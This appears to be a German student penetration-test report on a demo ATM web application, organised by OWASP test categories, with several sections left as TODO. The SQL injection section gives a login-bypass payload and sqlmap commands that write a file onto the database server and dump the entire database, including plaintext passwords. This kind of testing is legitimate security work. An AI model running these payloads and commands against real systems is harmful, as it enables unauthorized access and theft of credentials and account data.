
# Pentest Webanwendung  

## Beschreibung Entwicklungsumgebung und Tools:  
Betriebssystem: Windows 10 Build 17134.345  
IDE: IntelliJ IDEA 2018.2.6 (Ultimate Edition) Build #IU-182.5107.16  
MySQL 8.0.12  
Java 11.0.1  
Tomcat 9.0.12  

Kali Linux  2018.4-vbox-amd64  
OWASP ZAP 2.7.0 

Die zu testende Anwendung:  
https://github.com/Vituratic/ATMWebApplication


## Information Gathering
TODO: Aus ZAP rausschreiben an welchen Stellen Parameter übergeben werden und welche Servlets in welcher Reihenfolge aufgerufen werden.

## Configuration and deployment managment testing
TODO

## Identity Managment Testing
Registrierung und Password-Policy nicht vorhanden.  
Account raten ist schwierig, da nur eine kleine Anzahl an Accounts existiert und es keine vorgegebene Struktur gibt.  
Jedoch ist bekannt, dass nur Zahlen für den Benutzernamen in Frage kommen.  

## Authentication Testing
Username und Passwort werden nicht in der URL mitgesendet und auch nicht im http-body.  
JSPs, welche keinen direkten DatenbankZugriff vornehmen, können direkt aufgerufen werden (ohne Login).  
Dies kann zum Informationsgewinn dienen.  
Durch den Klau des Coockies in JSESSIONID kann man sich authentifizieren.  
![alt text](https://github.com/RocketJulia/Pentest/blob/master/Screenshots/Cookie.png)

## Authorization Testing
Es gibt keine Möglichkeit über das Einloggen als normaler Benutzer auf Funktionen des Admins zuzugreifen.  
Wenn man ausgeloggt ist, bleibt man ausgeloggt.

## Testing for Session Fixation
TODO

## Input Validation Testing

### SQL Injection
Es ist möglich sich mit folgenden Daten anzumelden:  
Kontonummer: 1 OR Passwort = "Pa55w0rt"  
Passwort = Pa55w0rt  
Dabei kann jedes beliebiges Passwort, welches irgendein Benutzer hat genutzt werden. (Bspw. durch das Raten von Passwörtern ist ein gültige Passwort findbar)  
Anschließend kann man für den ersten Account in der Datenbank mit dem geratenem Passwort den Kontostand sehen.  
Jedoch ist es nicht möglich weitere Aktionen auf dem Account auszuführen.  

Allerding kann man damit eine Blind SQL Injection durchführen.  
Bspw. mit dem Tool sqlmap und dem Kommando:  
sqlmap -u http://[IP-Adresse auf dem der Tomcat läuft]:8080/Servlet --data="uname=1 OR Passwort = \"Pa55w0rt\"&pasw=Pa55w0rt&bank=banka&loginOB="  

Dadruch kann bespielsweise eine Datei im DBMS abgelegt werden:  
sqlmap -u http://[IP-Adresse auf dem der Tomcat läuft]:8080/Servlet --data="uname=1 OR Passwort = \"Pa55w0rt\"&pasw=Pa55w0rt&bank=banka&loginOB=" --file-write"/tmp/datei" --file-dest="C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/datei"  

Oder es kann der gesamte Datenbankinhalt ausgegeben werden:  
sqlmap -u http://[IP-Adresse auf dem der Tomcat läuft]:8080/Servlet --data="uname=1 OR Passwort = \"Pa55w0rt\"&pasw=Pa55w0rt&bank=banka&loginOB=" --dump  
![alt text](https://github.com/RocketJulia/Pentest/blob/master/Screenshots/SQL_Injection.png) 

### XSS
TODO

## Testing for Error Handling
Man bekommt keine Fehlermeldungen angezeigt, wenn man falsche bzw. sinnlose Eingaben tätigt und kann somit auch keine StackTraces auslesen.

## Testing for weak Cryptography
Es findet keine verschlüsselte Übertragung von Daten statt, sodass man den Datenfluss abfangen und lesen kann. 
Beispielsweise Passwörter etc.  

Auch die Passwörter in der Datenbank sind nicht verschlüsselt.  
Mit einem Datenbankzugriff via Blind SQL Injection kann man somit alle Anemldedaten im Klartext erhalten. 
Siehe Punkt "SQL Incjection".

## Business Logic Testing
Da man Überweisungen mit 0€ oder an sich selbst tätigen kann, könnte man die Datenbank mit vielen Daten vollschreiben ohne Auswirkungen auf einen ACC.  

## Client Side Testing
Die Seite ist nicht gegen Clickjacking geschützt.  
Das haben wir [hiermit](https://github.com/RocketJulia/Pentest/tree/master/Dateien/Clickjacking.html) getestet.  
![alt text](https://github.com/RocketJulia/Pentest/blob/master/Screenshots/Clickjacking.png)
